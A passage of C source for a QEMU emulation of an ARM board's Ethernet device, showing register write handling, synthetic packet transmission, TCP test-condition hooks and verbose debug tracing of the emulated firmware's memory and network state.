                uint32_t pc = acpu ? acpu->env.regs[15] : 0;
                uint32_t lr = acpu ? acpu->env.regs[14] : 0;
                fprintf(stderr,
                        "[fe] INT_STATUS W1C val=%#" PRIx64
                        " old=%#x new=%#x pc=%#x lr=%#x\n",
                        val, s->int_status,
                        s->int_status & ~(uint32_t)val, pc, lr);
            }
        }
        s->int_status &= ~(uint32_t)val;       /* W1C */
        leopard_fe_update_irq(s);
        break;
    case FE_PDMA_INT_MASK:
        {
            static int int_mask_log;
            if (getenv("LEOPARD_FE_INT_TRACE") && int_mask_log++ < 32) {
                CPUState *cs = qemu_get_cpu(0);
                ARMCPU *acpu = ARM_CPU(cs);
                uint32_t pc = acpu ? acpu->env.regs[15] : 0;
                uint32_t lr = acpu ? acpu->env.regs[14] : 0;
                fprintf(stderr,
                        "[fe] INT_MASK val=%#" PRIx64
                        " old=%#x status=%#x pc=%#x lr=%#x\n",
                        val, s->int_mask, s->int_status, pc, lr);
            }
        }
        s->int_mask = val;
        leopard_fe_update_irq(s);
        break;
    default: {
        /* Store the value so subsequent reads return it (the firmware
         * polls some PPE bits and stalls if they're stuck at 0). */
        unsigned o = (unsigned)off & 0xfff;
        s->fe_misc[o >> 2] = (uint32_t)val;
        if (o == 0xfc8) {
            uint32_t mbuf = (uint32_t)val;
            uint32_t len = leopard_debug_read32(mbuf + 0x08);
            uint32_t data_ptr = leopard_debug_read32(mbuf + 0x0c);
            if (len && len <= 1600 && data_ptr) {
                uint8_t buf[1600];
                uint32_t send_len = len;
                hwaddr ba = leopard_dram_ptr(data_ptr);
                address_space_read(&address_space_memory, ba,
                                   MEMTXATTRS_UNSPECIFIED, buf, len);
                if (len >= 34 && buf[12] == 0x08 && buf[13] == 0x00) {
                    uint16_t ip_len = leopard_get_be16(buf + 16);
                    uint32_t frame_len = 14 + ip_len;
                    if (frame_len > len && frame_len <= sizeof(buf)) {
                        send_len = frame_len;
                        address_space_read(&address_space_memory, ba,
                                           MEMTXATTRS_UNSPECIFIED, buf,
                                           send_len);
                    }
                }
                if (len >= 42 && buf[12] == 0x08 && buf[13] == 0x06) {
                    uint8_t fw_mac[6];
                    leopard_fe_get_fw_mac(s, fw_mac);
                    memcpy(buf + 6, fw_mac, 6);
                    memcpy(buf + 22, fw_mac, 6);
                } else if (send_len >= 34 && buf[12] == 0x08 && buf[13] == 0x00) {
                    uint8_t fw_mac[6];
                    leopard_fe_get_fw_mac(s, fw_mac);
                    memcpy(buf + 6, fw_mac, 6);
                    leopard_fix_ipv4_checksums(buf + 14, send_len - 14);
                }
                if (send_len >= 54 && buf[12] == 0x08 && buf[13] == 0x00 &&
                    buf[14] == 0x45 && buf[23] == 6) {
                    const uint8_t *ip = buf + 14;
                    const uint8_t *tcp = ip + ((ip[0] & 0x0f) * 4);
                    uint16_t ip_len = leopard_get_be16(ip + 2);
                    fprintf(stderr,
                            "[fe] synthetic TX mbuf=%#x len=%u/%u data=%#x "
                            "%02x:%02x:%02x:%02x:%02x:%02x -> "
                            "%02x:%02x:%02x:%02x:%02x:%02x type=0800 "
                            "ip=%u.%u.%u.%u>%u.%u.%u.%u tcp=%u>%u "
                            "flags=%#x seq=%#x ack=%#x iplen=%u datalen=%u\n",
                            mbuf, len, send_len, data_ptr,
                            buf[6], buf[7], buf[8], buf[9], buf[10], buf[11],
                            buf[0], buf[1], buf[2], buf[3], buf[4], buf[5],
                            buf[26], buf[27], buf[28], buf[29],
                            buf[30], buf[31], buf[32], buf[33],
                            leopard_get_be16(tcp), leopard_get_be16(tcp + 2),
                            tcp[13], leopard_get_be32(tcp + 4),
                            leopard_get_be32(tcp + 8), ip_len,
                            ip_len >= (uint16_t)(((ip[0] & 0x0f) * 4) + ((tcp[12] >> 4) * 4)) ?
                            ip_len - ((ip[0] & 0x0f) * 4) - ((tcp[12] >> 4) * 4) : 0);
                    if (tcp[13] & 0x04) {
                        fprintf(stderr, "[fe] synthetic TX drop TCP RST\n");
                        goto synthetic_tx_done;
                    }
                    if (getenv("LEOPARD_INJECT_TCP_TINY_MSS") &&
                        leopard_get_be16(tcp) == 80 &&
                        leopard_get_be16(tcp + 2) == 40100) {
                        static int consume_log;
                        if (consume_log++ < 8) {
                            fprintf(stderr,
                                    "[fe] synthetic TX consume tiny-mss "
                                    "server packet\n");
                        }
                        leopard_fe_maybe_continue_tcp_tiny_mss(s, buf, send_len);
                        goto synthetic_tx_done;
                    }
                } else {
                    fprintf(stderr, "[fe] synthetic TX mbuf=%#x len=%u/%u data=%#x "
                            "%02x:%02x:%02x:%02x:%02x:%02x -> "
                            "%02x:%02x:%02x:%02x:%02x:%02x type=%02x%02x\n",
                            mbuf, len, send_len, data_ptr,
                            buf[6], buf[7], buf[8], buf[9], buf[10], buf[11],
                            buf[0], buf[1], buf[2], buf[3], buf[4], buf[5],
                            buf[12], buf[13]);
                }
                if (leopard_fe_tx_dedup(s, buf, send_len)) {
                    fprintf(stderr,
                            "[fe] synthetic TX dedup mbuf=%#x data=%#x len=%u\n",
                            mbuf, data_ptr, send_len);
                } else if (s->nic) {
                    qemu_send_packet(qemu_get_queue(s->nic), buf, send_len);
                }
                leopard_fe_maybe_inject_tcp_pmtu_low(s, buf, send_len);
                leopard_fe_maybe_start_tcp_tiny_mss_from_tx(s, buf, send_len);
                leopard_fe_maybe_continue_tcp_tiny_mss(s, buf, send_len);
synthetic_tx_done:
                ;
            } else {
                fprintf(stderr, "[fe] synthetic TX skip mbuf=%#x len=%u data=%#x\n",
                        mbuf, len, data_ptr);
            }
        }
        if (o == 0xfcc) {
            uint32_t mbuf = (uint32_t)val;
            uint32_t len = leopard_debug_read32(mbuf + 0x08);
            uint32_t data_ptr = leopard_debug_read32(mbuf + 0x0c);
            bool tiny_mss_active = getenv("LEOPARD_INJECT_TCP_TINY_MSS") != NULL;
            if (len && len <= 1500 && data_ptr &&
                (s->peer_mac_valid || tiny_mss_active)) {
                uint8_t frame[1514];
                uint8_t fw_mac[6];
                const uint8_t fallback_peer_mac[6] = {
                    0x52, 0x55, 0xc0, 0xa8, 0x00, 0xfe
                };
                hwaddr ba = leopard_dram_ptr(data_ptr);
                bool drop_to_slirp = false;

                leopard_fe_get_fw_mac(s, fw_mac);
                memcpy(frame, s->peer_mac_valid ? s->peer_mac : fallback_peer_mac, 6);
                memcpy(frame + 6, fw_mac, 6);
                frame[12] = 0x08;
                frame[13] = 0x00;
                address_space_read(&address_space_memory, ba,
                                   MEMTXATTRS_UNSPECIFIED, frame + 14, len);
                leopard_fix_ipv4_checksums(frame + 14, len);
                if (len >= 20 && frame[14] == 0x45 && frame[23] == 6) {
                    const uint8_t *ip = frame + 14;
                    const uint8_t *tcp = ip + ((ip[0] & 0x0f) * 4);
                    uint16_t ip_sum = leopard_ip_checksum(ip, (ip[0] & 0x0f) * 4);
                    uint16_t tcp_sum = leopard_tcp_checksum(ip, len);
                    fprintf(stderr,
                            "[fe] synthetic L3 TX mbuf=%#x len=%u data=%#x "
                            "%02x:%02x:%02x:%02x:%02x:%02x -> "
                            "%02x:%02x:%02x:%02x:%02x:%02x "
                            "ip=%u.%u.%u.%u>%u.%u.%u.%u proto=6 "
                            "tcp=%u>%u flags=%#x seq=%#x ack=%#x "
                            "win=%u csum=%#x/%#x ipcsum=%#x/%#x\n",
                            mbuf, len, data_ptr,
                            frame[6], frame[7], frame[8], frame[9], frame[10], frame[11],
                            frame[0], frame[1], frame[2], frame[3], frame[4], frame[5],
                            frame[26], frame[27], frame[28], frame[29],
                            frame[30], frame[31], frame[32], frame[33],
                            leopard_get_be16(tcp), leopard_get_be16(tcp + 2),
                            tcp[13], leopard_get_be32(tcp + 4),
                            leopard_get_be32(tcp + 8), leopard_get_be16(tcp + 14),
                            leopard_get_be16(tcp + 16), tcp_sum,
                            leopard_get_be16(ip + 10), ip_sum);
                    if (getenv("LEOPARD_INJECT_TCP_TINY_MSS") &&
                        leopard_get_be16(tcp) == 80 &&
                        leopard_get_be16(tcp + 2) == 40100) {
                        drop_to_slirp = true;
                    }
                } else {
                    fprintf(stderr, "[fe] synthetic L3 TX mbuf=%#x len=%u data=%#x "
                            "%02x:%02x:%02x:%02x:%02x:%02x -> "
                            "%02x:%02x:%02x:%02x:%02x:%02x ip=%u.%u.%u.%u>%u.%u.%u.%u proto=%u\n",
                            mbuf, len, data_ptr,
                            frame[6], frame[7], frame[8], frame[9], frame[10], frame[11],
                            frame[0], frame[1], frame[2], frame[3], frame[4], frame[5],
                            frame[26], frame[27], frame[28], frame[29],
                            frame[30], frame[31], frame[32], frame[33], frame[23]);
                }
                if (drop_to_slirp) {
                    static int consume_l3_log;
                    if (consume_l3_log++ < 8) {
                        fprintf(stderr,
                                "[fe] synthetic L3 consume tiny-mss "
                                "server packet\n");
                    }
                } else if (leopard_fe_tx_dedup(s, frame, len + 14)) {
                    fprintf(stderr,
                            "[fe] synthetic L3 TX dedup mbuf=%#x data=%#x len=%u\n",
                            mbuf, data_ptr, len + 14);
                } else if (s->nic) {
                    qemu_send_packet(qemu_get_queue(s->nic), frame, len + 14);
                }
                leopard_fe_maybe_inject_tcp_pmtu_low(s, frame, len + 14);
                leopard_fe_maybe_start_tcp_tiny_mss_from_tx(s, frame, len + 14);
                leopard_fe_maybe_continue_tcp_tiny_mss(s, frame, len + 14);
            } else {
                fprintf(stderr, "[fe] synthetic L3 skip mbuf=%#x len=%u data=%#x peer=%d\n",
                        mbuf, len, data_ptr, s->peer_mac_valid);
            }
        }
        if (o == 0xf60 || o == 0xf64 || o == 0xf68 || o == 0xf6c ||
            o == 0xf70 || o == 0xf74 || o == 0xf78 || o == 0xf7c ||
            o == 0xf80 || o == 0xf84 || o == 0xf88 || o == 0xf8c ||
            o == 0xf90 || o == 0xf94 ||
            o == 0xfa0 || o == 0xfa4 || o == 0xfa8 || o == 0xfac ||
            o == 0xfb0 || o == 0xfb4 ||
            o == 0xfb8 || o == 0xfbc || o == 0xfc0 || o == 0xfc4 ||
            o == 0xfc8 || o == 0xfcc ||
            o == 0xfd0 || o == 0xfd4 || o == 0xfd8 || o == 0xfdc ||
            o == 0xfe0 || o == 0xfe4 || o == 0xfe8 || o == 0xfec ||
            o == 0xff0 || o == 0xff4 || o == 0xff8 || o == 0xffc) {
            CPUState *cs = qemu_get_cpu(0);
            ARMCPU *acpu = ARM_CPU(cs);
            uint32_t pc = acpu ? acpu->env.regs[15] : 0;
            uint32_t lr = acpu ? acpu->env.regs[14] : 0;
            const char *trace_name;
            static uint32_t ab_base, ab_cap, ab_cur, ab_end, ab_read_len;

            switch (o) {
            case 0xf64:
                ab_base = val;
                break;
            case 0xf68:
                ab_cap = val;
                break;
            case 0xf6c:
                ab_cur = val;
                break;
            case 0xf70:
                ab_end = val;
                break;
            case 0xf78:
                ab_read_len = val;
                break;
            default:
                break;
            }

            if ((o == 0xf78 || o == 0xf7c) &&
                ab_base >= 0x40000000 && ab_base < 0x42000000 &&
                ab_cap && ab_cap <= 0x100000) {
                uint32_t cap_addr = ab_base + ab_cap;
                uint8_t buf[0x180];
                uint32_t dump_addr = cap_addr - 0x40;
                const char *phase = (o == 0xf78) ? "pre-read" : "post-read";

                address_space_read(&address_space_memory, dump_addr,
                                   MEMTXATTRS_UNSPECIFIED, buf, sizeof(buf));
                fprintf(stderr,
                        "[active-body-cap-dump %s] base=%#x cap=%#x "
                        "cur=%#x end=%#x read_len=%#x ret=%#x "
                        "cur_to_cap=%#x end_to_cap=%#x dump=%#x..%#x\n",
                        phase, ab_base, ab_cap, ab_cur, ab_end, ab_read_len,
                        (o == 0xf7c) ? (uint32_t)val : 0,
                        cap_addr - ab_cur, cap_addr - ab_end, dump_addr,
                        dump_addr + (uint32_t)sizeof(buf));
                for (int i = 0; i < (int)sizeof(buf); i += 16) {
                    fprintf(stderr, "  %#010x:", dump_addr + i);
                    for (int j = 0; j < 16; j++) {
                        fprintf(stderr, " %02x", buf[i + j]);
                    }
                    fprintf(stderr, "  ");
                    for (int j = 0; j < 16; j++) {
                        uint8_t c = buf[i + j];
                        fputc((c >= 0x20 && c < 0x7f) ? c : '.', stderr);
                    }
                    fprintf(stderr, "\n");
                }
            }

            if (o == 0xf7c && val == ab_read_len && ab_read_len == 0x1000 &&
                ab_base && ab_cap && ab_end == ab_base + ab_cap) {
                leopard_active_body_overflow_seen = true;
            }

            switch (o) {
            case 0xf60:
                trace_name = "active_body_req";
                break;
            case 0xf64:
                trace_name = "active_body_base";
                break;
            case 0xf68:
                trace_name = "active_body_cap";
                break;
            case 0xf6c:
                trace_name = "active_body_cur";
                break;
            case 0xf70:
                trace_name = "active_body_end";
                break;
            case 0xf74:
                trace_name = "active_body_len";
                break;
            case 0xf78:
                trace_name = "active_body_read_len";
                break;
            case 0xf7c:
                trace_name = "active_body_ret";
                break;
            case 0xfa0:
                trace_name = "dir_lookup_server";
                break;
            case 0xfa4:
                trace_name = "dir_lookup_path";
                {
                    char path[40] = {0};
                    cpu_physical_memory_read(val, path, sizeof(path) - 1);
                    for (int i = 0; i < (int)sizeof(path) - 1; i++) {
                        if ((uint8_t)path[i] < 0x20 || (uint8_t)path[i] >= 0x7f) {
                            path[i] = 0; break;
                        }
                    }
                    fprintf(stderr, "[fe-trace] dir_lookup_path = %#x \"%s\"\n",
                            (unsigned)val, path);
                }
                break;
            case 0xfb0:
                trace_name = "send_chunk_ret";
                break;
            case 0xfb4:
                trace_name = "url_handler";
                break;
            case 0xfb8:
                trace_name = "body_send_len";
                break;
            case 0xfbc:
                trace_name = "body_send_ret";
                break;
            case 0xfc0:
                trace_name = "appstart_handler";
                break;
            case 0xf80: {
                /* Hex+ASCII dump of 0x2c bytes at val (= buf_d4 base). */
                uint8_t buf[0x2c] = {0};
                if (val >= 0x40000000 && val < 0x42000000) {
                    address_space_read(&address_space_memory, (hwaddr)val,
                                       MEMTXATTRS_UNSPECIFIED, buf, sizeof(buf));
                }
                fprintf(stderr, "[fe-trace] buf_d4 @ %#x:\n", (unsigned)val);
                for (int i = 0; i < (int)sizeof(buf); i += 16) {
                    char hex[64], asc[20]; int p=0;
                    for (int j = 0; j < 16 && i+j < (int)sizeof(buf); j++) {
                        p += snprintf(hex+p, sizeof(hex)-p, "%02x ", buf[i+j]);
                        asc[j] = (buf[i+j] >= 0x20 && buf[i+j] < 0x7f) ? buf[i+j] : '.';
                    }
                    asc[16] = 0;
                    fprintf(stderr, "  +%02x: %-48s  %s\n", i, hex, asc);
                }
                trace_name = NULL;
                break;
            }
            case 0xf84: {
                /* Hex+ASCII dump of 0x48 bytes at val (= buf_a8 base). */
                uint8_t buf[0x48] = {0};
                if (val >= 0x40000000 && val < 0x42000000) {
                    address_space_read(&address_space_memory, (hwaddr)val,
                                       MEMTXATTRS_UNSPECIFIED, buf, sizeof(buf));
                }
                fprintf(stderr, "[fe-trace] buf_a8 @ %#x:\n", (unsigned)val);
                for (int i = 0; i < (int)sizeof(buf); i += 16) {
                    char hex[64], asc[20]; int p=0;
                    for (int j = 0; j < 16 && i+j < (int)sizeof(buf); j++) {
                        p += snprintf(hex+p, sizeof(hex)-p, "%02x ", buf[i+j]);
                        asc[j] = (buf[i+j] >= 0x20 && buf[i+j] < 0x7f) ? buf[i+j] : '.';
                    }
                    asc[16] = 0;
                    fprintf(stderr, "  +%02x: %-48s  %s\n", i, hex, asc);
                }
                trace_name = NULL;
                break;
            }
            case 0xf88:
                trace_name = "readline_dest";
                break;
            case 0xf8c:
                trace_name = "readline_len";
                break;
            case 0xf90:
                trace_name = "readline_base";
                break;
            case 0xf94:
                trace_name = "readline_limit";
                break;
            case 0xfc8: {
                /* string-pointer channel (raw, like 0xfc4 but no name). */
                char buf[80] = {0};
                if (val >= 0x40000000 && val < 0x42000000) {
                    address_space_read(&address_space_memory,
                                       (hwaddr)val,
                                       MEMTXATTRS_UNSPECIFIED,
                                       buf, sizeof(buf) - 1);
                    for (int i = 0; i < (int)sizeof(buf); i++) {
                        if ((unsigned char)buf[i] < 0x20 || buf[i] == 0x7f) {
                            buf[i] = 0;
                            break;
                        }
                    }
                }
                fprintf(stderr, "[fe-trace] str_arg0 = %#x \"%s\"\n",
                        (unsigned)val, buf);
                trace_name = NULL;
                break;
            }
            case 0xfcc: {
                char buf[80] = {0};
                if (val >= 0x40000000 && val < 0x42000000) {
                    address_space_read(&address_space_memory,
                                       (hwaddr)val,
                                       MEMTXATTRS_UNSPECIFIED,
                                       buf, sizeof(buf) - 1);
                    for (int i = 0; i < (int)sizeof(buf); i++) {
                        if ((unsigned char)buf[i] < 0x20 || buf[i] == 0x7f) {
                            buf[i] = 0;
                            break;
                        }
                    }
                }
                fprintf(stderr, "[fe-trace] str_arg1 = %#x \"%s\"\n",
                        (unsigned)val, buf);
                trace_name = NULL;
                break;
            }
            case 0xfac: {
                fprintf(stderr,
                        "[fe-trace] rx_dispatch_ifp = %#x cb100=%#x flags2c=%#x "
                        "type3c=%#x addrlist=%#x\n",
                        (unsigned)val,
                        leopard_debug_read32((uint32_t)val + 0x100),
                        leopard_debug_read32((uint32_t)val + 0x2c),
                        leopard_debug_read32((uint32_t)val + 0x3c),
                        leopard_debug_read32((uint32_t)val + 0x10));
                trace_name = NULL;
                break;
            }
            case 0xfc4: {
                /* Name pointer: read the string from guest DRAM and log it. */
                char namebuf[24] = {0};
                if (val >= 0x40000000 && val < 0x42000000) {
                    address_space_read(&address_space_memory,
                                       (hwaddr)val,
                                       MEMTXATTRS_UNSPECIFIED,
                                       namebuf, sizeof(namebuf) - 1);
                    for (int i = 0; i < (int)sizeof(namebuf); i++) {
                        if ((unsigned char)namebuf[i] < 0x20 || namebuf[i] == 0x7f) {
                            namebuf[i] = 0;
                            break;
                        }
                    }
                }
                fprintf(stderr, "[fe-trace] appstart_name = %#x \"%s\"\n",
                        (unsigned)val, namebuf);
                trace_name = NULL; /* skip the generic fprintf below */
                break;
            }
            case 0xfa8:
                trace_name = "dir_lookup_ret";
                break;
            case 0xfd0:
                trace_name = "tcp_pcb_lookup";
                break;
            case 0xfd4:
                trace_name = "httpd_autostart";
                {
                    uint32_t pre = 0;
                    cpu_physical_memory_read(0x406906ac, &pre, 4);
                    fprintf(stderr,
                        "[httpd-glob] at autostart-trigger *(0x406906ac)=%#x\n",
                        pre);
                    static int dumped;
                    if (!dumped) {
                        dumped = 1;
                        /* Dump app lifecycle list at 0x406a14f8 / 0x406a1500
                         * to identify which AppStart hangs. */
                        fprintf(stderr, "[applist] dumping context around 0x406a14e0..1520\n");
                        for (uint32_t a = 0x406a14e0; a < 0x406a1530; a += 4) {
                            uint32_t v = 0;
                            cpu_physical_memory_read(a, &v, 4);
                            fprintf(stderr, "  [%#010x] = %#010x\n", a, v);
                        }
                        for (int head_off = 0; head_off < 2; head_off++) {
                            uint32_t head_addr = 0x406a14f8 + head_off * 8;
                            uint32_t head = 0;
                            cpu_physical_memory_read(head_addr, &head, 4);
                            fprintf(stderr, "[applist] *%#x = %#x\n", head_addr, head);
                            uint32_t cur = head;
                            for (int i = 0; cur && i < 32; i++) {
                                uint8_t blob[0x40];
                                cpu_physical_memory_read(cur, blob, sizeof(blob));
                                fprintf(stderr, "  app[%d] @ %#010x:\n", i, cur);
                                for (int j = 0; j < (int)sizeof(blob); j += 16) {
                                    fprintf(stderr, "    +%02x:", j);
                                    for (int k = 0; k < 16; k++) {
                                        fprintf(stderr, " %02x", blob[j + k]);
                                    }
                                    fprintf(stderr, "  ");
                                    for (int k = 0; k < 16; k++) {
                                        uint8_t c = blob[j + k];
                                        fputc((c >= 0x20 && c < 0x7f) ? c : '.', stderr);
                                    }
                                    fprintf(stderr, "\n");
                                }
                                /* If the entry has a name pointer in any of the first
                                 * 8 fields, try to print as string. */
                                for (int f = 0; f < 8; f++) {
                                    uint32_t p;
                                    memcpy(&p, blob + f * 4, 4);
                                    if (p >= 0x40400000 && p < 0x40700000) {
                                        char nm[32] = {0};
                                        cpu_physical_memory_read(p, nm, sizeof(nm) - 1);
                                        int printable = 1;
                                        for (int k = 0; k < 8 && nm[k]; k++) {
                                            if ((uint8_t)nm[k] < 0x20 || (uint8_t)nm[k] >= 0x7f) {
                                                printable = 0; break;
                                            }
                                        }
                                        if (printable && nm[0]) {
                                            fprintf(stderr, "    +%02x -> %#x = \"%s\"\n",
                                                    f * 4, p, nm);
                                        }
                                    }
                                }
                                /* Assume linked list, next at offset 0. */
                                uint32_t next;
                                memcpy(&next, blob, 4);
                                if (next == cur) break;
                                cur = next;
                            }
                        }
                    }
                }
                break;
            case 0xfd8:
                trace_name = "tcp_state";
                break;
            case 0xfdc:
                trace_name = "tcp_marker";
                if ((val == 0x2118 || val == 0x214c || val == 0x216c ||
                     val == 0x21a8 || val == 0x241c || val == 0x242c) && acpu) {
                    uint32_t helper = acpu->env.regs[4];
                    uint32_t helper_mbuf = leopard_debug_read32(helper + 0x00);
                    uint32_t ctx = leopard_debug_read32(helper + 0x04);
                    uint32_t data = leopard_debug_read32(helper + 0x08);
                    uint32_t l4 = leopard_debug_read32(helper + 0x0c);
                    uint32_t flags = leopard_debug_read32(helper + 0x16);
                    uint32_t owner = leopard_debug_read32(helper + 0x1c);
                    uint32_t owner_vtbl = owner ? leopard_debug_read32(owner) : 0;
                    fprintf(stderr,
                            "[fe-trace] ip_class marker=%#x helper=%#x r0=%#x r4=%#x r5=%#x "
                            "mbuf=%#x ctx=%#x data=%#x l4=%#x flags16=%#x owner=%#x vtbl=%#x\n",
                            (unsigned)val, helper, acpu->env.regs[0],
                            acpu->env.regs[4], acpu->env.regs[5],
                            helper_mbuf, ctx, data, l4, flags, owner, owner_vtbl);
                    if (val == 0x216c &&
                        acpu->env.regs[0] >= 0x40000000 &&
                        acpu->env.regs[0] < 0x42000000) {
                        leopard_fe_seed_ip_class_ctx_for(acpu->env.regs[0]);
                    }
                    if (val == 0x21a8 && ctx >= 0x40000000 && ctx < 0x42000000) {
                        leopard_fe_seed_ip_class_ctx();
                        fprintf(stderr, "[fe-trace] ip_class_ctx:");
                        for (int i = 0; i < 0x60; i += 4) {
                            fprintf(stderr, " +%02x=%#x", i,
                                    leopard_debug_read32(ctx + i));
                        }
                        fprintf(stderr, "\n");
                    }
                }
                if (val == 0xfbf0 && acpu) {
                    uint32_t mbuf = acpu->env.regs[0];
                    uint32_t ifp = acpu->env.regs[5];
                    uint32_t data = leopard_debug_read32(mbuf + 0x0c);
                    uint32_t flags = leopard_debug_read32(mbuf + 0x10);
                    uint32_t pkt_len = leopard_debug_read32(mbuf + 0x1c);
                    uint32_t buf_len = leopard_debug_read32(mbuf + 0x08);
                    uint32_t port_word = leopard_debug_read32(ifp + 0x24);
                    uint32_t port_index = port_word - 0xc0000001u;
                    uint32_t port_table_root = leopard_debug_read32(0x4071c4c8);
                    uint32_t port_entry = 0;
                    uint32_t mac_base = 0;
                    uint32_t mac_off = 0;
                    if (port_table_root) {
                        uint32_t slot_addr = port_table_root + port_index * 4;
                        uint32_t slot = leopard_debug_read32(slot_addr);
                        port_entry = slot ? leopard_debug_read32(slot) : 0;
                        mac_off = port_entry ? leopard_debug_read8(port_entry + 5) : 0;
                        mac_base = port_entry ? port_entry + 8 + mac_off : 0;
                    }
                    fprintf(stderr,
                            "[fe-trace] eth_handler_mbuf r0=%#x ifp=%#x r1=%#x r2=%#x r3=%#x "
                            "mbuf_data=%#x mbuf_flags=%#x mbuf_len=%#x mbuf_buflen=%#x "
                            "port_word=%#x port_root=%#x port_entry=%#x mac_base=%#x\n",
                            mbuf,
                            ifp,
                            acpu->env.regs[1],
                            acpu->env.regs[2],
                            acpu->env.regs[3],
                            data, flags, pkt_len, buf_len,
                            port_word, port_table_root, port_entry, mac_base);
                    if (data >= 0x4000000e && data < 0x42000000) {
                        uint8_t hdr[14] = {0};
                        address_space_read(&address_space_memory,
                                           (hwaddr)(data - 14),
                                           MEMTXATTRS_UNSPECIFIED,
                                           hdr, sizeof(hdr));
                        fprintf(stderr, "[fe-trace] eth_handler_l2:");
                        for (int i = 0; i < 14; i++) {
                            fprintf(stderr, " %02x", hdr[i]);
                        }
                        fprintf(stderr, "\n");
                    }
                    if (mac_base >= 0x40000000 && mac_base < 0x42000000) {
                        uint8_t mac[8] = {0};
                        address_space_read(&address_space_memory,
                                           (hwaddr)mac_base,
                                           MEMTXATTRS_UNSPECIFIED,
                                           mac, sizeof(mac));
                        fprintf(stderr, "[fe-trace] eth_handler_expected_mac:");
                        for (int i = 0; i < 8; i++) {
                            fprintf(stderr, " %02x", mac[i]);
                        }
                        fprintf(stderr, "\n");
                    }
                }
                if ((val == 0xb8ec || val == 0xbaa8 || val == 0xbaac ||
                     val == 0xbabc || val == 0xbb2c || val == 0xbb30 ||
                     val == 0xbb34) && acpu) {
                    uint32_t sp = acpu->env.regs[13];
                    uint32_t saved_r0 = 0;
                    uint32_t saved_lr = 0;

                    if (sp >= 0x40000000 && sp < 0x42000000 - 0x0c) {
                        saved_r0 = leopard_debug_read32(sp);
                        saved_lr = leopard_debug_read32(sp + 8);
                    }
                    fprintf(stderr,
                            "[fe-trace] ip_policy marker=%#x r0=%#x r1=%#x r2=%#x r3=%#x "
                            "r4=%#x r5=%#x r6=%#x r7=%#x lr=%#x saved_r0=%#x saved_lr=%#x\n",
                            (unsigned)val,
                            acpu->env.regs[0],
                            acpu->env.regs[1],
                            acpu->env.regs[2],
                            acpu->env.regs[3],
                            acpu->env.regs[4],
                            acpu->env.regs[5],
                            acpu->env.regs[6],
                            acpu->env.regs[7],
                            acpu->env.regs[14],
                            saved_r0,
                            saved_lr);
                }
                break;
            case 0xfe0:
                trace_name = "ip_marker";
                break;
            case 0xfe4:
                trace_name = "minifs_read_status";
                break;
            case 0xfe8:
                trace_name = "minifs_read_len";
                break;
            case 0xfec:
                trace_name = "minifs_read_meta";
                break;
            case 0xff0:
                trace_name = "rx_ethertype";
                break;
            case 0xff4:
                trace_name = "rx_dispatch_ret";
                break;
            case 0xff8:
                trace_name = "rx_proto_handler";
                break;
            default:
                trace_name = "rx_proto_ret";
                break;
            }
            if (trace_name) {
                fprintf(stderr, "[fe-trace] %s = %#x  (pc=%#x lr=%#x)\n",
                        trace_name, (unsigned)val, pc, lr);
            }
        }
        /* Log distinct offsets once each. */
        static uint8_t seen[0x1000];
        if (!seen[o]) {
            seen[o] = 1;
            CPUState *cs = qemu_get_cpu(0);
            ARMCPU *acpu = ARM_CPU(cs);
            uint32_t pc = acpu ? acpu->env.regs[15] : 0;
            fprintf(stderr, "[fe] WR unhandled %#06x = %#x  (pc=%#x)\n",
                    o, (unsigned)val, pc);
        }
        break;
    }
    }
}

static const MemoryRegionOps leopard_fe_ops = {
    .read = leopard_fe_read,
    .write = leopard_fe_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
    .valid.min_access_size = 4,
    .valid.max_access_size = 4,
};

static NetClientInfo leopard_fe_net_info = {
    .type = NET_CLIENT_DRIVER_NIC,
    .size = sizeof(NICState),
    .can_receive = leopard_fe_can_receive,
    .receive = leopard_fe_receive,
};

static void leopard_fe_realize(DeviceState *dev, Error **errp)
{
    LeopardFEState *s = LEOPARD_FE(dev);
    SysBusDevice *sbd = SYS_BUS_DEVICE(dev);

    memory_region_init_io(&s->iomem, OBJECT(s), &leopard_fe_ops, s,
                          TYPE_LEOPARD_FE, LEOPARD_FE_SIZE);
    sysbus_init_mmio(sbd, &s->iomem);
    sysbus_init_irq(sbd, &s->irq);
    leopard_fe_singleton = s;

    qemu_macaddr_default_if_unset(&s->conf.macaddr);
    s->nic = qemu_new_nic(&leopard_fe_net_info, &s->conf,
                          object_get_typename(OBJECT(dev)), dev->id,
                          &dev->mem_reentrancy_guard, s);
    qemu_format_nic_info_str(qemu_get_queue(s->nic), s->conf.macaddr.a);
    s->rx_delay_timer = timer_new_ns(QEMU_CLOCK_HOST,
                                     leopard_fe_rx_delay_timer_cb, s);
}

static const Property leopard_fe_properties[] = {
    DEFINE_NIC_PROPERTIES(LeopardFEState, conf),
};

static void leopard_fe_class_init(ObjectClass *klass, const void *data)
{
    DeviceClass *dc = DEVICE_CLASS(klass);
    dc->realize = leopard_fe_realize;
    device_class_set_props(dc, leopard_fe_properties);
    set_bit(DEVICE_CATEGORY_NETWORK, dc->categories);
}

static const TypeInfo leopard_fe_type_info = {
    .name = TYPE_LEOPARD_FE,
    .parent = TYPE_SYS_BUS_DEVICE,
    .instance_size = sizeof(LeopardFEState),
    .class_init = leopard_fe_class_init,
};

static void leopard_fe_register_types(void)
{
    type_register_static(&leopard_fe_type_info);
}
type_init(leopard_fe_register_types)

static struct arm_boot_info leopard_binfo;
static hwaddr leopard_reset_pc;

static void leopard_cpu_reset(void *opaque)
{
    ARMCPU *cpu = opaque;
    cpu_reset(CPU(cpu));
    cpu_set_pc(CPU(cpu), leopard_reset_pc);
}

static void leopard_init(MachineState *machine)
{
    MemoryRegion *sysmem = get_system_memory();
    ARMCPU *cpus[2];
    MemoryRegion *dram = g_new(MemoryRegion, 1);
    MemoryRegion *timer = g_new(MemoryRegion, 1);
    DeviceState *gic = NULL;
    int num_cpus = machine->smp.cpus;
    int n;

    if (num_cpus > 2) {
        num_cpus = 2;
    }

    /* CPUs */
    for (n = 0; n < num_cpus; n++) {
        cpus[n] = ARM_CPU(object_new(machine->cpu_type));
        if (n > 0) {
            /* Secondary CPUs start powered off, waiting for PSCI wakeup */
            object_property_set_bool(OBJECT(cpus[n]), "start-powered-off",
                                     true, &error_fatal);
        }
        object_property_set_bool(OBJECT(cpus[n]), "realized",
                                 true, &error_fatal);
    }

    /* GICv2: distributor at 0x10310000, CPU interface at 0x10320000 */
    {
        gic = qdev_new(TYPE_ARM_GIC);
        SysBusDevice *gicbus = SYS_BUS_DEVICE(gic);
        /* PPI numbers (offset within the 16 PPI slots, INTID = 16 + ppi) */
        const int timer_ppi[] = {
